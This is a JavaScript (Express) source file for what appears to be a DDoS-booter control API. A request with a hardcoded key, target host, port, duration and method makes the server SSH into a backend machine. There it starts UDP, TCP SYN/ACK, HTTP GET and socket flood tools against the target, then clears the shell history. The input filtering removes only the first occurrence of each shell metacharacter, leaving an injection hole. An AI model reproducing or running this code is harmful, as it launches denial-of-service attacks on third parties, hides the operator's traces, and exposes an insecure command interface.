var Client = require('ssh2').Client;
const express = require('express');
const app = express();
app.use(express.json());

function send(cmd){
var conn = new Client();
conn.on('ready', function() {
  //console.log('connected');  
  conn.shell(function(err, stream) {
    if (err) throw err;
    stream.on('close', function() {
      //console.log('disconnected');
      conn.end();
    }).on('data', function(data) {
		//console.log(data+' ');
    });
    stream.end(cmd+' \nhistory -c \nexit \n');
  });
}).connect({
  host: '',
  port: 22,
  username: '',
  password: ''
});
};


app.get('/', (req, res) => {
    if (req.query.key != "pieapple"){
        res.status(400).send([{errors:400},{massage: "Wrong key",status: "online"}]);
        console.log(req.query);
    } else {
        if (req.query.method == undefined){
            res.status(400).send({massage: "Wrong method",status: "online"});
            console.log(req.query);
        }else {
            var METHOD = req.query.method;
            var delMETHOD = METHOD.replace('|','').replace(';','').replace('&','').replace('https://','').replace('http://','').replace('/','');
            if(req.query.host == undefined){
                res.status(400).send({massage: "Wrong host",status: "online"});
                console.log(req.query);
            }else if (delMETHOD == "STOP"){
                var IP = req.query.host;
                var delIP = IP.replace('|','').replace(';','').replace('&','').replace('https://','').replace('http://','').replace('/','');
                var secIP = delIP.replace('.','').replace('.','').replace('.','').replace('.','');
                send('screen -X -S '+ secIP +' quit');
                res.status(200).send([{massage: "success",status: "online"},req.query]);
                console.log(req.query)
            }else if(req.query.port == undefined){
                res.status(400).send({massage: "Wrong port",status: "online"});
                console.log(req.query);
            }else if(req.query.time == undefined){
                res.status(400).send({massage: "Wrong time",status: "online"});
                console.log(req.query);
            }else if(req.query.time >= 300){
                res.status(400).send({massage: "time <= 300",status: "online"});
                console.log(req.query);
            }else{
                var IP = req.query.host;
                var url = IP.replace('|','').replace(';','').replace('&','');
                var PORT = req.query.port;
                var TIME = req.query.time;
                var METHOD = req.query.method;
                var delIP = IP.replace('|','').replace(';','').replace('&','').replace('https://','').replace('http://','').replace('/','');
                var secIP = delIP.replace('.','').replace('.','').replace('.','').replace('.','');
                var delPORT = PORT.replace('|','').replace(';','').replace('&','').replace('https://','').replace('http://','').replace('/','');
                var delTIME = TIME.replace('|','').replace(';','').replace('&','').replace('https://','').replace('http://','').replace('/','');
                var delMETHOD = METHOD.replace('|','').replace(';','').replace('&','').replace('https://','').replace('http://','').replace('/','');
                if(delMETHOD == "UDP"){
                    send('screen -dmS '+ secIP +' /root/apiddos/UDP '+ delIP +' '+ delPORT +' 10 1020 10 ' + delTIME);
                    res.status(200).send([{massage: "success",status: "online"},req.query]);
                    console.log(req.query)
                }else if (delMETHOD == "TCPACK"){
                    send('screen -dmS '+ secIP +' /root/apiddos/TCP '+ delIP +' '+ delPORT +' 10 -1 '+ delTIME + ' ack');
                    res.status(200).send([{massage: "success",status: "online"},req.query]);
                    console.log(req.query)
                }else if (delMETHOD == "HTTPGET"){
                    send('screen -dmS '+ secIP +' /root/apiddos/httpsflood ' + url + ' 1000 ' + delTIME);
                    res.status(200).send([{massage: "success",status: "online"},req.query]);
                    console.log(req.query)
                }else if (delMETHOD == "TCPSYN"){
                    send('screen -dmS '+ secIP +' /root/apiddos/TCP '+ delIP +' '+ delPORT +' 10 -1 '+ delTIME + ' syn');
                    res.status(200).send([{massage: "success",status: "online"},req.query]);
                    console.log(req.query)
                }else if (delMETHOD == "SOCKET"){
                    send('screen -dmS '+ secIP +' timeout '+ delTIME +' python3 /root/apiddos/cc.py '+ url);
                    res.status(200).send([{massage: "success",status: "online"},req.query]);
                    console.log(req.query)
                }
            }
        }
        }

});
app.get('/status', (req, res) => {
    res.status(200).send([{status: "online"},req.query]);
});
const port = 1234;
app.listen(port, () => console.log(`Listening on port: ${port} `));